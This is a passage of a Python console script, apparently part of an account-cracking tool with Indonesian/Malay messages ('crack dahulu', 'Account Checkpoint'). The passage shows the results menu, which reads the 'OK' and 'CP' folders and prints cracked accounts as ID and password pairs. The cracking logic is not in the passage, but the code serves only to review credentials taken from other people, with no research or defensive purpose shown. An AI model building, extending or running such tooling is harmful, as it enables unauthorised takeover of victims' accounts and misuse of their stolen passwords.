						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			HtgCp = 0
			for Cpku in range(len(Cari2)):
				Cpny = Cari2[
					HtgCp
					].split('|')
				tree = Tree(
					""
				)
				tree.add(
					"\r[bold #00FF00]Account Succesfully"
					).add(
					f"\r[bold purple]{Cpny[0]}|{Cpny[1]}"
					).add(
					f"\r[bold purple]{Cpny[2]}"
					,style="bold white"
				)
				tree.add(
					f"\r[white]{Cpny[3]}"
					,style="bold #00FF00"
				)
				Cetak(
					tree
				)
				HtgCp +=1
			print(
				''
			)
			Console(width=48).print(
				Panel(
					'[bold #FF00D4]cek selesai, enter untuk ke menu',
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			Console().input(
				'[bold purple]   ╰─> '
				)
			Back_Menu(
			)
	elif Choose in ('2'):
		try:
			Cari = os.listdir(
				'CP'
			)
		except FileNotFoundError:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file tidak ada",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				3
				)
			Back_Menu(
			)
		if len(Cari) == 0:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file kosong, crack dahulu",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				2
				)
			Back_Menu(
			)
		else:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]daftar hasil akun cp anda",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			Htg = 0
			Fns = {}
			for Data in Cari:
				try:
					Isi = open('CP/'+Data,'r').readlines()
				except:
					continue
				Htg+=1
				if Htg < 10:
					Nom = (
						''
						+
						str(
							Htg
						)
					)
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Fns.update(
						{
							Nom
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [bold #FFFFFF]0'
						+
						Nom
						+
						'[#FFFFFF]. '
						+
						Data
						+
						'[bold #FFF000] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
				else:
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]'
						+
						str(
							Htg
						)
						+
						'. '
						+
						Data
						+
						'[bold #FFF000] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]input nomer daftar hasil diatas",
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			View = Console().input(
				'[bold purple]   ╰─> '
			)
			try:
				Liat = Fns[
					View
				]
			except KeyError:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]macam tak betul budek ni",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			try:
				Cari2 = open(
					'CP/'
					+
					Liat,
					'r'
				).read().splitlines()
			except:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]file tidak ada",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			HtgCp = 0
			for Cpku in range(len(Cari2)):
				Cpny = Cari2[
					HtgCp
					].split('|')
				tree = Tree("")
				tree.add(
					"\r[bold #FFFF00]Account Checkpoint"
					).add(
					f"\r[bold #FF0000]{Cpny[0]}|{Cpny[1]}"
					,style="bold #FFF000"
				)
				Cetak(
					tree
				)
				HtgCp +=1
			print(
				''
			)
			Console(width=48).print(
				Panel(
					'[bold #FF00D4]cek selesai, enter untuk ke menu',
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			Console().input(
				'[bold purple]   ╰─> '
				)
			Back_Menu(
			)
	elif Choose in ('3'):
		Back_Menu(
		)
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]macam tak betul budek ni",
				width=48,
				style="bold purple"
				),
			justify="center"
		)
		sleep(
			1
			)
		exit(
	)
if __name__=='__main__':
	try:
		os.mkdir(
			'OK'
		)
	except:
		pass
	try:
		os.mkdir(
			'CP'
		)
	except:
		pass
	Main_Menu(
)